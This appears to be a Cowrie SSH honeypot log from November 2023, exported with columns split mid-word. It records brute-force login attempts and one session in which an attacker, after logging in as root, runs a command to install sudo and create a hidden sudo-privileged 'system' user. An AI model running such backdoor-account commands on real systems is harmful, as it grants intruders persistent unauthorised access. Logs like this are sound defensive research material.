2023-11-27T04:04:03+0000	[-] Python Version 3.11.2 (main, Mar 13 2023, 12:18:29) [GCC 12.2.0]	Unnamed: 2	Unnamed: 3	Unnamed: 4
2023-11-29T07:38:05+0000	[cowrie.ssh.transport.HoneyPotSSHTransport#debug] kex alg=b'curve25519-sha256' key alg=b'ecdsa-sha2-n	is	tp2	56'
2023-11-29T07:38:05+0000	[cowrie.ssh.transport.HoneyPotSSHTransport#debug] outgoing: b'aes128-ctr' b'hmac-sha2-256' b'none'			
2023-11-29T07:38:05+0000	[cowrie.ssh.transport.HoneyPotSSHTransport#debug] incoming: b'aes128-ctr' b'hmac-sha2-256' b'none'			
2023-11-29T07:38:05+0000	[cowrie.ssh.transport.HoneyPotSSHTransport#debug] NEW KEYS			
2023-11-29T07:38:05+0000	[cowrie.ssh.transport.HoneyPotSSHTransport#debug] starting service b'ssh-userauth'			
2023-11-29T07:38:06+0000	[cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'osmc' trying auth b'none'			
2023-11-29T07:38:06+0000	[cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'osmc' trying auth b'password'			
2023-11-29T07:38:06+0000	[HoneyPotSSHTransport,301,146.190.63.65] Could not read etc/userdb.txt, default database activated			
2023-11-29T07:38:06+0000	[HoneyPotSSHTransport,301,146.190.63.65] login attempt [b'osmc'/b'osmc'] failed			
2023-11-29T07:38:07+0000	[cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'osmc' failed auth b'password'			
2023-11-29T07:38:07+0000	[cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] unauthorized login: ()			
2023-11-29T07:38:07+0000	[cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost			
2023-11-29T07:38:07+0000	[HoneyPotSSHTransport,301,146.190.63.65] Connection lost after 1 seconds			
2023-11-29T07:42:45+0000	[cowrie.ssh.factory.CowrieSSHFactory] No moduli, no diffie-hellman-group-exchange-sha1			
2023-11-29T07:42:45+0000	[cowrie.ssh.factory.CowrieSSHFactory] No moduli, no diffie-hellman-group-exchange-sha256			
2023-11-29T07:42:45+0000	[cowrie.ssh.factory.CowrieSSHFactory] New connection: 170.64.144.45:53506 (172.17.0.2:2222) [session:	e	582	63d7b2c2]
2023-11-29T07:42:46+0000	[HoneyPotSSHTransport,302,170.64.144.45] Remote SSH version: SSH-2.0-Go			
2023-11-29T07:42:46+0000	[HoneyPotSSHTransport,302,170.64.144.45] SSH client hassh fingerprint: 4e066189c3bbeec38c99b185511373	3a		
2023-11-29T07:42:46+0000	[cowrie.ssh.transport.HoneyPotSSHTransport#debug] kex alg=b'curve25519-sha256' key alg=b'ecdsa-sha2-n	is	tp2	56'
2023-11-29T07:42:46+0000	[cowrie.ssh.transport.HoneyPotSSHTransport#debug] outgoing: b'aes128-ctr' b'hmac-sha2-256' b'none'			
2023-11-29T07:42:46+0000	[cowrie.ssh.transport.HoneyPotSSHTransport#debug] incoming: b'aes128-ctr' b'hmac-sha2-256' b'none'			
2023-11-29T07:42:47+0000	[cowrie.ssh.transport.HoneyPotSSHTransport#debug] NEW KEYS			
2023-11-29T07:42:47+0000	[cowrie.ssh.transport.HoneyPotSSHTransport#debug] starting service b'ssh-userauth'			
2023-11-29T07:42:47+0000	[cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'root' trying auth b'none'			
2023-11-29T07:42:48+0000	[cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'root' trying auth b'password'			
2023-11-29T07:42:48+0000	[HoneyPotSSHTransport,302,170.64.144.45] Could not read etc/userdb.txt, default database activated			
2023-11-29T07:42:48+0000	[HoneyPotSSHTransport,302,170.64.144.45] login attempt [b'root'/b'0'] succeeded			
2023-11-29T07:42:48+0000	[HoneyPotSSHTransport,302,170.64.144.45] Initialized emulated server as architecture: linux-x64-lsb			
2023-11-29T07:42:48+0000	[cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'root' authenticated with b'password'			
2023-11-29T07:42:48+0000	[cowrie.ssh.transport.HoneyPotSSHTransport#debug] starting service b'ssh-connection'			
2023-11-29T07:42:49+0000	[cowrie.ssh.connection.CowrieSSHConnection#debug] got channel b'session' request			
2023-11-29T07:42:49+0000	[cowrie.ssh.session.HoneyPotSSHSession#info] channel open			
2023-11-29T07:42:50+0000	"[twisted.conch.ssh.session#info] Executing command ""b'apt update && apt install sudo curl -y && sudo"	us	era	"dd -m -p $(openssl passwd -1 6KHku9KE) system && sudo usermod -aG sudo system && sudo usermod -aG sudo system'"""
2023-11-29T07:42:50+0000	[SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,302,170.64.144.45] CM	D:	ap	t update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 6KHku9KE) system && sudo usermod -aG sudo system && sudo usermod -aG sudo system
2023-11-29T07:42:50+0000	[SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,302,170.64.144.45] CM	D:	op	enssl passwd -1 6KHku9KE
2023-11-29T07:42:50+0000	[SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,302,170.64.144.45] Ca	n'	t f	ind command openssl
2023-11-29T07:42:50+0000	[SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,302,170.64.144.45] Co	mm	and	not found: openssl passwd -1 6KHku9KE
2023-11-29T07:42:50+0000	[twisted.conch.ssh.session#info] exitCode: 0			
2023-11-29T07:42:50+0000	[cowrie.ssh.connection.CowrieSSHConnection#debug] sending request b'exit-status'			
2023-11-29T07:42:50+0000	[cowrie.ssh.connection.CowrieSSHConnection#info] sending close 0			
2023-11-29T07:42:50+0000	[SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,302,170.64.144.45] Ca	n'	t f	ind command apt
2023-11-29T07:42:50+0000	[SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,302,170.64.144.45] Co	mm	and	not found: apt update
2023-11-29T07:42:50+0000	[twisted.conch.ssh.session#info] exitCode: 0			
2023-11-29T07:42:50+0000	[SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,302,170.64.144.45] Ca	n'	t f	ind command apt
2023-11-29T07:42:50+0000	[SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,302,170.64.144.45] Co	mm	and	not found: apt install sudo curl -y
2023-11-29T07:42:50+0000	[twisted.conch.ssh.session#info] exitCode: 0			
2023-11-29T07:42:50+0000	[SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,302,170.64.144.45] Co	mm	and	found: sudo useradd -m -p  system
2023-11-29T07:42:50+0000	[SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,302,170.64.144.45] Co	mm	and	found: sudo usermod -aG sudo system
2023-11-29T07:42:50+0000	[SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,302,170.64.144.45] Ca	n'	t f	ind command usermod
2023-11-29T07:42:50+0000	[SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,302,170.64.144.45] Ca	n'	t f	ind command -aG
2023-11-29T07:42:50+0000	[SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,302,170.64.144.45] Co	mm	and	found: sudo usermod -aG sudo system
2023-11-29T07:42:50+0000	[SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,302,170.64.144.45] Ca	n'	t f	ind command usermod
2023-11-29T07:42:50+0000	[SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,302,170.64.144.45] Ca	n'	t f	ind command -aG
2023-11-29T07:42:50+0000	[SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,302,170.64.144.45] Ca	n'	t f	ind command system
2023-11-29T07:42:50+0000	[twisted.conch.ssh.session#info] exitCode: 0			
2023-11-29T07:42:51+0000	[cowrie.ssh.session.HoneyPotSSHSession#info] remote close			
2023-11-29T07:42:51+0000	[HoneyPotSSHTransport,302,170.64.144.45] Closing TTY Log: var/lib/cowrie/tty/6970ea7ef88f09abcaca99f1	57	ee2	5a9e84bb05997993b3e3cedbabc7b1c5d10 after 1 seconds
2023-11-29T07:42:51+0000	[HoneyPotSSHTransport,302,170.64.144.45] avatar root logging out			
2023-11-29T07:42:51+0000	[cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost			
2023-11-29T07:42:51+0000	[HoneyPotSSHTransport,302,170.64.144.45] Connection lost after 5 seconds			
2023-11-29T07:43:40+0000	[cowrie.ssh.factory.CowrieSSHFactory] No moduli, no diffie-hellman-group-exchange-sha1			
2023-11-29T07:43:40+0000	[cowrie.ssh.factory.CowrieSSHFactory] No moduli, no diffie-hellman-group-exchange-sha256			
2023-11-29T07:43:40+0000	[cowrie.ssh.factory.CowrieSSHFactory] New connection: 146.190.63.65:42298 (172.17.0.2:2222) [session:	1	4c2	351f1fa4]
2023-11-29T07:43:40+0000	[HoneyPotSSHTransport,303,146.190.63.65] Remote SSH version: SSH-2.0-Go			
2023-11-29T07:43:40+0000	[HoneyPotSSHTransport,303,146.190.63.65] SSH client hassh fingerprint: 4e066189c3bbeec38c99b185511373	3a		
2023-11-29T07:43:40+0000	[cowrie.ssh.transport.HoneyPotSSHTransport#debug] kex alg=b'curve25519-sha256' key alg=b'ecdsa-sha2-n	is	tp2	56'
2023-11-29T07:43:40+0000	[cowrie.ssh.transport.HoneyPotSSHTransport#debug] outgoing: b'aes128-ctr' b'hmac-sha2-256' b'none'			
2023-11-29T07:43:40+0000	[cowrie.ssh.transport.HoneyPotSSHTransport#debug] incoming: b'aes128-ctr' b'hmac-sha2-256' b'none'			
2023-11-29T07:43:40+0000	[cowrie.ssh.transport.HoneyPotSSHTransport#debug] NEW KEYS			
2023-11-29T07:43:40+0000	[cowrie.ssh.transport.HoneyPotSSHTransport#debug] starting service b'ssh-userauth'			
2023-11-29T07:43:40+0000	[cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'osmc' trying auth b'none'			
2023-11-29T07:43:40+0000	[cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'osmc' trying auth b'password'			
2023-11-29T07:43:40+0000	[HoneyPotSSHTransport,303,146.190.63.65] Could not read etc/userdb.txt, default database activated			
2023-11-29T07:43:40+0000	[HoneyPotSSHTransport,303,146.190.63.65] login attempt [b'osmc'/b'osmc123'] failed			
2023-11-29T07:43:41+0000	[cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'osmc' failed auth b'password'			
2023-11-29T07:43:41+0000	[cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] unauthorized login: ()			
2023-11-29T07:43:41+0000	[cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost			
2023-11-29T07:43:41+0000	[HoneyPotSSHTransport,303,146.190.63.65] Connection lost after 1 seconds			
2023-11-29T07:49:14+0000	[cowrie.ssh.factory.CowrieSSHFactory] No moduli, no diffie-hellman-group-exchange-sha1			
2023-11-29T07:49:14+0000	[cowrie.ssh.factory.CowrieSSHFactory] No moduli, no diffie-hellman-group-exchange-sha256			
2023-11-29T07:49:14+0000	[cowrie.ssh.factory.CowrieSSHFactory] New connection: 146.190.63.65:40058 (172.17.0.2:2222) [session:	4	df5	7d68edbc]
2023-11-29T07:49:14+0000	[HoneyPotSSHTransport,304,146.190.63.65] Remote SSH version: SSH-2.0-Go			
2023-11-29T07:49:14+0000	[HoneyPotSSHTransport,304,146.190.63.65] SSH client hassh fingerprint: 4e066189c3bbeec38c99b185511373	3a		
2023-11-29T07:49:14+0000	[cowrie.ssh.transport.HoneyPotSSHTransport#debug] kex alg=b'curve25519-sha256' key alg=b'ecdsa-sha2-n	is	tp2	56'
2023-11-29T07:49:14+0000	[cowrie.ssh.transport.HoneyPotSSHTransport#debug] outgoing: b'aes128-ctr' b'hmac-sha2-256' b'none'			
